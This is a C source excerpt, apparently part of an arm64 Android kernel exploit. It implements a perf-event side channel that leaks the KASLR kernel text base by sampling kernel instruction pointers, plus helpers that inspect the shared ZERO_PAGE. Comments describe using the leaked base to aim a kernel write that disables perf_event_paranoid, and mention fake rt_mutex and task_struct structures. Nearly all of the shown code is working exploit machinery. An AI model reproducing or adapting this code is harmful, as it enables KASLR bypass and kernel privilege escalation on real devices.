   * (0x1cbc on this build), so only samples inside [_text+0x1000,
   * _text+0x3000] may pick the slot.  Wider windows admitted samples from
   * other 2MB slots: every boot that produced slot_off=0x81cbc wrote
   * paranoid successfully, and every boot that produced 0x1c8050 / 0x9f210
   * / 0x8475c instead aimed the write at a bogus address and panicked.
   */
  const uint64_t mark_lo = text_off + 0x1000ULL;
  const uint64_t mark_hi = text_off + 0x3000ULL;
  uint64_t min_kip = ~(uint64_t)0;
  int n = 0;
  while (data_tail < data_head) {
    struct perf_event_header *ev =
        (struct perf_event_header *)(base + (data_tail % data_size));
    if (ev->size == 0) {
      break;
    }
    if (data_tail + ev->size > data_head) {
      break;
    }
    if (ev->type == PERF_RECORD_SAMPLE &&
        (ev->misc & PERF_RECORD_MISC_KERNEL)) {
      uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
      if (ip >= KIMAGE_TEXT_BASE) {
        uint64_t off = ip & (PERF_LEAK_ALIGN - 1);
        if (off >= mark_lo && off <= mark_hi && ip < min_kip) {
          min_kip = ip;
        }
        n++;
      }
    }
    data_tail += ev->size;
  }
  header->data_tail = data_tail;

  munmap(mmap_buf, mmap_size);
  close(fd);
  *samples_out = n;
  return min_kip;
}

uint64_t perf_leak_text_base(void) {
  int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
  if (pfd >= 0) {
    char pbuf[16];
    ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
    close(pfd);
    if (pn > 0) {
      pbuf[pn] = 0;
      if (atoi(pbuf) > 1) {
        pr_warning("perf text-base perf_event_paranoid too high\n");
        return 0;
      }
    }
  }

  /*
   * _text always sits at KIMAGE_TEXT_BASE's 2MB slot plus TEXT_OFFSET
   * (0x80000 on pfum10): arm64 KASLR relocates the image with 2MB
   * granularity and keeps TEXT_OFFSET, so _text & (PERF_LEAK_ALIGN-1)
   * == KIMAGE_TEXT_BASE & (PERF_LEAK_ALIGN-1).  Verified against live
   * kallsyms:  _text=ffffffda66480000 -> _text & 0x1fffff == 0x80000.
   * The old code added P0_KERNEL_PHYS_DELTA to an already-absolute kernel
   * VA, which put the base hundreds of MB too high.
   *
   * That only holds when min_kip really is inside _text's own slot, i.e.
   * min_kip & (PERF_LEAK_ALIGN-1) >= text_off.  A single round usually
   * misses the entry path, so sample repeatedly and stop once the global
   * minimum has settled inside that slot.  Refusing to guess keeps a
   * wrong base from turning into an unmapped write target.
   */
  uint64_t text_off = KIMAGE_TEXT_BASE & (PERF_LEAK_ALIGN - 1);
  /*
   * Picking the global minimum was wrong: one round that samples a low
   * out-of-range address locked in as min_kip and then rejected every later
   * round that DID land inside _text's own 2MB slot (seen live: rounds 1-5
   * returned slot_off=0x81cbc, a valid in-slot hit, while round 0 had
   * poisoned min_kip with slot_off=0x12984).  Classify each round's sample
   * instead and only let in-slot samples compete, then require the same slot
   * to be hit twice so a single stray mapping cannot pick the base.
   */
  struct {
    uint64_t slot;
    int hits;
    uint64_t min;
  } cand[4];
  int nc = 0;
  uint64_t min_any = ~(uint64_t)0;
  int total = 0;

  for (int round = 0; round < PERF_LEAK_ROUNDS; round++) {
    int n = 0;
    uint64_t m = perf_sample_round(&n);
    total += n;
    if (m == ~(uint64_t)0) {
      pr_warning("perf text-base round=%d collected nothing\n", round);
      continue;
    }
    if (m < min_any) min_any = m;
    if (m < 0xffffff0000000000ULL) {
      pr_info("perf round=%d samples=%d round_min=%016llx (not a kernel VA)\n",
              round, n, (unsigned long long)m);
      continue;
    }
    uint64_t slot_off = m & (PERF_LEAK_ALIGN - 1);
    if (slot_off < text_off) {
      pr_info("perf round=%d samples=%d round_min=%016llx slot_off=%016llx "
              "below _text slot\n",
              round, n, (unsigned long long)m, (unsigned long long)slot_off);
      continue;
    }
    uint64_t slot = m & ~(PERF_LEAK_ALIGN - 1);
    int idx = -1;
    for (int i = 0; i < nc; i++) {
      if (cand[i].slot == slot) {
        idx = i;
        break;
      }
    }
    if (idx < 0) {
      if (nc == (int)(sizeof(cand) / sizeof(cand[0]))) continue;
      idx = nc++;
      cand[idx].slot = slot;
      cand[idx].hits = 0;
      cand[idx].min = ~(uint64_t)0;
    }
    cand[idx].hits++;
    if (m < cand[idx].min) cand[idx].min = m;
    pr_info("perf round=%d samples=%d round_min=%016llx slot=%016llx "
            "hits=%d min=%016llx\n",
            round, n, (unsigned long long)m, (unsigned long long)slot,
            cand[idx].hits, (unsigned long long)cand[idx].min);

    int best = -1;
    for (int i = 0; i < nc; i++) {
      if (best < 0 || cand[i].hits > cand[best].hits ||
          (cand[i].hits == cand[best].hits && cand[i].min < cand[best].min)) {
        best = i;
      }
    }
    if (best >= 0 && cand[best].hits >= 2) break;
  }

  if (total == 0 || min_any == ~(uint64_t)0) {
    pr_warning("perf text-base no kernel samples collected\n");
    return 0;
  }
  int best = -1;
  for (int i = 0; i < nc; i++) {
    if (best < 0 || cand[i].hits > cand[best].hits ||
        (cand[i].hits == cand[best].hits && cand[i].min < cand[best].min)) {
      best = i;
    }
  }
  if (best < 0 || cand[best].hits < 2) {
    pr_warning("perf text-base no 2MB slot confirmed twice (min_any=%016llx "
               "candidates=%d); refusing to guess a base\n",
               (unsigned long long)min_any, nc);
    return 0;
  }

  uint64_t slot = cand[best].slot;
  uint64_t min_kip = cand[best].min;
  uint64_t slot_off = min_kip & (PERF_LEAK_ALIGN - 1);
  uint64_t text_base = slot + text_off;
  if (text_base > min_kip || (min_kip - text_base) > 0x3000ULL ||
      (min_kip - text_base) < 0x1000ULL ||
      text_base < 0xffffff0000000000ULL) {
    pr_warning("perf text-base out of range: %016llx\n",
               (unsigned long long)text_base);
    return 0;
  }
  pr_success("perf text-base pid=%d samples=%d min_kip=%016llx "
             "slot_off=%016llx text_base=%016llx\n",
             getpid(), total, (unsigned long long)min_kip,
             (unsigned long long)slot_off, (unsigned long long)text_base);
  return text_base;
}

/*
 * A read fault on an anonymous mapping maps the shared ZERO_PAGE, so two
 * freshly touched read-only anon pages are a userspace read primitive for
 * empty_zero_page.  Gated on KS_DUMP_ZERO: prints every non-zero qword so
 * a run shows exactly which offsets the fake rt_mutex (lock+0x08/+0x10) or
 * the fake task_struct (pi_lock / pi_waiters) left dirty in the shared
 * page, plus whether the two mappings still agree (i.e. they really are
 * the same physical page and not private zeroed copies).
 */
/*
 * The shared ZERO_PAGE backs every untouched anonymous mapping in the
 * system, so a single non-zero word written into it is enough to hand
 * zygote garbage and get the phone rebooted.  Checked after every route
 * attempt -- not just at the end -- so the log shows which attempt did it.
 */
int shared_zero_dirty(void) {
  size_t len = 0x2000;
  char *a = mmap(NULL, len, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (a == MAP_FAILED) return -1;
  int n = 0;
  for (size_t off = 0; off < len; off += 8) {
    uint64_t v = 0;
    memcpy(&v, a + off, 8);
    if (v) n++;
  }
  munmap(a, len);
  return n;
}

void dump_shared_zero_page(const char *tag) {
  const char *env = getenv("KS_DUMP_ZERO");
  if (!env || !env[0] || strcmp(env, "0") == 0) return;
  size_t len = 0x2000;
  char *a = mmap(NULL, len, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  char *b = mmap(NULL, len, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (a == MAP_FAILED || b == MAP_FAILED) {
    pr_warning("zero %s mmap failed\n", tag);
    return;
  }
  int n_a = 0, n_b = 0, same = 1, shown = 0;
  for (size_t off = 0; off < len; off += 8) {
    uint64_t va = 0, vb = 0;
    memcpy(&va, a + off, 8);
    memcpy(&vb, b + off, 8);
    if (va) n_a++;
    if (vb) n_b++;
    if (va != vb) same = 0;
    if (va && shown < 48) {
      pr_info("zero %s off=0x%03zx val=%016llx\n", tag, off,
              (unsigned long long)va);
      shown++;
    }
  }
  pr_info("zero %s nonzero=%d/%d shared=%d shown=%d\n", tag, n_a, n_b, same,
          shown);
  munmap(a, len);
  munmap(b, len);
}
